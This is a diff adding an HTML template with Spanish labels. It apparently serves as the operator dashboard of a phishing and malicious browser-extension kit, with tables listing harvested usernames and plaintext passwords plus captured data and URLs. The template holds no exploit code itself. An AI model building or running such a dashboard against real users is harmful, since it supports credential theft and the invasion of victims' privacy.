@@ -1,0 +1,69 @@
+{% extends "./index.html" %}
+
+{% block phishing %}
+
+  <div class="panel panel-default">
+    <div class="panel-heading">Contraseñas guardadas</div>
+
+    <!-- Table -->
+    <table class="table table-striped">
+      <thead>
+        <tr>
+          <th> # </th>
+          <th> Usuario </th>
+          <th> Contraseña </th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for userData in phishingData %}
+        <tr>
+          <td>
+            {{ userData.id }}
+          </td>
+          <td>
+            {{ userData.username }}
+          </td>
+          <td>
+            {{ userData.password }}
+          </td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+{% endblock %}
+
+{% block extension %}
+
+  <div class="panel panel-default">
+    <div class="panel-heading">Datos de la extensión</div>
+
+    <!-- Table -->
+    <table class="table table-striped">
+      <thead>
+        <tr>
+          <th> # </th>
+          <th> Data </th>
+          <th> Url </th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for userData in extensionData %}
+        <tr>
+          <td style="word-break:break-all;">
+            {{ userData.id }}
+          </td>
+          <td style="word-break:break-all;">
+            {{ userData.data }}
+          </td>
+          <td style="word-break:break-all;">
+            {{ userData.url }}
+          </td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+{% endblock %}
